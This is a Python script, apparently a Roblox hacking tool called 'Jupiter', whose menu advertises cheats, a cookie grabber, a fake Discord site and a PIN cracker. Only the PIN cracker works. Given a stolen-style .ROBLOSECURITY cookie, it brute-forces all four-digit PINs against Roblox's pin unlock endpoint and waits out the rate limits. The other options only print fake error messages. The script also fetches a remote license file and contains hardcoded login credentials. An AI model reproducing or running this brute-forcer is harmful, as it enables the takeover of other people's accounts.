# Sorry closed for public!
from pystyle import Colorate, Colors, Add, Center, Write
import os
import time
import keyboard
import requests
settingsAll = requests.get("https://raw.githubusercontent.com/VZXdev/Jupiter/refs/heads/main/license")


def getBanner():
	bannerText = """

                    Very strong tool for roblox 
     Cheats, Pin cracker, Password cracker, cookie grabber, and more!
                        [By JealLeal]
"""
	
	bannerLogo = """
       _             _ _            
      | |           (_) |           
      | |_   _ _ __  _| |_ ___ _ __ 
  _   | | | | | '_ \| | __/ _ \ '__|
 | |__| | |_| | |_) | | ||  __/ |   
  \____/ \__,_| .__/|_|\__\___|_|   
              | |                   
              |_|                  
"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

os.system("cls")
print('')
print(getBanner())
import requests
import re
import string
import time
import os
from pystyle import Colorate, Colors, Add, Center, Write


year = time.localtime().tm_year
day = time.localtime().tm_mday
month = time.localtime().tm_mon
def getCracker():
	bannerText = f"""

     Very strong pin cracker
        Work on {day}.{month}.{year}
            press "Enter" to exit
                   [By JealLeal]
"""
	
	bannerLogo = """
       _             _ _            
      | |           (_) |           
      | |_   _ _ __  _| |_ ___ _ __ 
  _   | | | | | '_ \| | __/ _ \ '__|
 | |__| | |_| | |_) | | ||  __/ |   
  \____/ \__,_| .__/|_|\__\___|_|   
              | |                   
              |_|                  
"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

def Pin_Cracker():
    os.system("cls")
    print('')
    print(getCracker())
    print('')
    cookie = Write.Input('Enter your cookie below:', Colors.green, interval=0.0025)
    os.system("cls")
    print('')

    url = 'https://auth.roblox.com/v1/account/pin/unlock'
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
    xcrsf = (token.headers['x-csrf-token'])
    header = {'X-CSRF-TOKEN': xcrsf}

    i = 0

    for i in range(9999):
        try:
            pin = str(i).zfill(4)
            payload = {'pin': pin}
            r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
            if 'unlockedUntil' in r.text:
                print(f'Pin Cracked! Pin: {pin}')
            
            elif 'Too many requests made' in r.text:
                
                print('  Ratelimited, trying again in 60 seconds..')
                time.sleep(60)
                
            elif 'Authorization' in r.text:
                
                print('  Error! Is the cookie valid?')
                break
            
            elif 'Incorrect' in r.text:
                print(f"  Tried: {pin} , Incorrect!")
                time.sleep(10)  
            elif 'MethodNotAllowed' in r.text:
                Write.Print('Method Not Allowed. Sorry we cant do anything\n', Colors.green, interval=0.0025)
        except:
            print('  Error!')

    
def GetNumber():
    if settingsAll.text == "true":
        print("yes")
    a = 1
    Number = Write.Input("[1] Cheats (Kefir sploit);\n[2] Cookie grabber;\n[3] Discord fake site\n[4] Roblox Pin cracker\n Write number (1, 2, 3, 4): ", Colors.green, interval=0.0025)
    if Number == "1":
        Write.Print("Waiting for open file...\n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        dol = 0
        while dol != 10:
            Write.Print("[Error] accets not downloaded. Redownload files in 2 sec...\n", Colors.red, interval=0.0025)
            time.sleep(2)
            Write.Print("[Error] Waiting for open file...\n", Colors.red, interval=0.0025)
            dol +=1
        a = 0
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
        Write.Print("[Error] ATTENTION! YOUR DEVICE DOES NOT SUPPORT KEFIRSPLOIT! PLEASE GO TO UBANTU!\n", Colors.red, interval=0.0025)
    elif Number == "2":
        Write.Print("Our servers off, please wait\n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == "3":
        Write.Print("Our servers off, please wait\n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == "4":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        Pin_Cracker()
        a = 0

def login():
    Write.Print("Please login... \n", Colors.green_to_blue, interval=0.0025)
    User = Write.Input("Username: ", Colors.green_to_blue, interval=0.0025)
    Pas = Write.Input("Password: ", Colors.green_to_blue, interval=0.0025)
    if User == "JealLeal" and Pas == "Vitalik228":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        print(getBanner())
        GetNumber()
    elif User == "Guest" and Pas == "123":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        GetNumber()
    else:
        Write.Print("Incorrect login or password!", Colors.green_to_blue, interval=0.0025)
        time.sleep(3)
        os.system("cls")
        print('')
        print(getBanner())
        login()
Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
login()
